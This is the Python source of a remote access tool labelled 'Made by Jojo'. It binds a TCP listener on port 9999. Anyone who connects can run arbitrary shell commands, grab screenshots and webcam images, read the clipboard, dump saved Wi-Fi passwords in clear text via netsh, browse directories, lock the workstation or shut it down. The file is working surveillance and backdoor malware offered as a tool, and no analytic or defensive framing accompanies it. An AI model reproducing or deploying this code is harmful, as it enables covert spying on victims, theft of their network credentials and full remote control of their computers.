import socket
import subprocess
import platform
import os
import mss
import cv2
import clipboard
import glob
import re

cd = os.path.expanduser("~")
BUFFER_SIZE = 4096


def banner():
    print("""
       JJJJJJJ     OOOOOOO       JJJJJJJ     OOOOOOO
          J       O       O         J       O       O
          J       O       O         J       O       O
      J   J       O       O     J   J       O       O
       JJJ         OOOOOOO       JJJ         OOOOOOO

                 Remote Access Tool
                  Made by Jojo
    """)


def get_system_info():
    return "\n".join([
        f"Platform: {platform.platform()}",
        f"System: {platform.system()}",
        f"Node Name: {platform.node()}",
        f"Release: {platform.release()}",
        f"Version: {platform.version()}",
        f"Machine: {platform.machine()}",
        f"Processor: {platform.processor()}",
        f"CPU Cores: {os.cpu_count()}",
        f"Username: {os.getlogin()}"
    ])


def capture_screenshot():
    with mss.mss() as sct:
        path = os.path.join(cd, "capture.png")
        sct.shot(output=path)
    with open(path, "rb") as f:
        data = f.read()
    os.remove(path)
    return data


def capture_webcam_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return b"ERROR: Unable to open webcam."
    ret, frame = cap.read()
    if ret:
        filename = "webcam.jpg"
        cv2.imwrite(filename, frame)
        with open(filename, "rb") as f:
            data = f.read()
        os.remove(filename)
        cap.release()
        return data
    else:
        cap.release()
        return b"ERROR: Failed to capture webcam image."


def run_shell_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        return stdout + stderr if stdout or stderr else b"No output."
    except Exception as e:
        return str(e).encode()


def get_clipboard_content():
    try:
        content = clipboard.paste()
        return content.encode() if content else b"Clipboard is empty."
    except Exception as e:
        return f"Clipboard error: {e}".encode()


def get_wifi_passwords():
    try:
        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)
        xml_files = glob.glob('*.xml')
        output = ""
        for file_path in xml_files:
            with open(file_path, 'r') as f:
                content = f.read()
                ssid_match = re.search(r'<name>(.*?)</name>', content)
                password_match = re.search(r'<keyMaterial>(.*?)</keyMaterial>', content)
                if ssid_match and password_match:
                    output += f"SSID: {ssid_match.group(1)}\nPassword: {password_match.group(1)}\n\n"
            try:
                os.remove(file_path)
            except Exception:
                pass
        return output.encode() if output else b"No Wi-Fi passwords found."
    except Exception as e:
        return f"Wi-Fi error: {e}".encode()


def lock_windows():
    try:
        result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return b"Windows session locked." if result.returncode == 0 else b"Failed to lock session."
    except Exception as e:
        return f"Lock error: {e}".encode()


def shutdown_windows():
    commands = [
        ['shutdown', '/s', '/t', '5'],
        ['shutdown.exe', '/s', '/t', '5']
    ]
    for cmd in commands:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            return b"Shutdown initiated in 5 seconds."
    return b"Failed to shutdown."


def list_directory(path):
    if not os.path.isdir(path):
        return b"Directory does not exist."
    try:
        contents = os.listdir(path)
        return "\n".join(contents).encode() if contents else b"Directory is empty."
    except Exception as e:
        return f"List error: {e}".encode()


def change_directory(current_dir, new_dir):
    new_path = os.path.join(current_dir, new_dir)
    if os.path.isdir(new_path):
        return os.path.abspath(new_path)
    else:
        return None


def handle_command(data, current_dir):
    parts = data.strip().split(' ', 1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd == "sys":
        return get_system_info(), current_dir
    elif cmd == "screen":
        return capture_screenshot(), current_dir
    elif cmd == "webcam":
        return capture_webcam_image(), current_dir
    elif cmd == "clipboard":
        return get_clipboard_content(), current_dir
    elif cmd == "wifi":
        return get_wifi_passwords(), current_dir
    elif cmd == "lock":
        return lock_windows(), current_dir
    elif cmd == "shutdown":
        return shutdown_windows(), current_dir
    elif cmd == "ls":
        return list_directory(arg or current_dir), current_dir
    elif cmd == "cd":
        if arg:
            new_path = change_directory(current_dir, arg)
            if new_path:
                return f"Changed directory to {new_path}", new_path
            else:
                return "Directory does not exist.", current_dir
        else:
            return "Missing directory argument.", current_dir
    else:
        return run_shell_command(data), current_dir


def start_server():
    banner()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 9999))
    s.listen(5)
    print("Listening on port 9999...")

    while True:
        conn, addr = s.accept()
        print(f"Connection from {addr}")
        with conn:
            current_dir = cd
            while True:
                try:
                    data = conn.recv(BUFFER_SIZE)
                    if not data:
                        break

                    command_text = data.decode(errors='ignore').strip()
                    if command_text.lower() == "exit":
                        conn.sendall(b"Connection closed.")
                        break

                    response, current_dir = handle_command(command_text, current_dir)
                    if response is None:
                        response = "No response from command."

                    if isinstance(response, bytes):
                        data_to_send = response
                    elif isinstance(response, str):
                        data_to_send = response.encode()
                    else:
                        data_to_send = str(response).encode()

                    if command_text.split(' ')[0].lower() in ['screen', 'webcam']:
                        header = f"FILE\n{len(data_to_send)}\n".encode()
                        conn.sendall(header)

                    conn.sendall(data_to_send)

                except Exception as e:
                    try:
                        error_msg = f"ERROR: {str(e)}".encode()
                        conn.sendall(error_msg)
                    except:
                        pass
                    break
        print(f"Disconnected from {addr}")
    
if __name__ == "__main__":
    start_server()
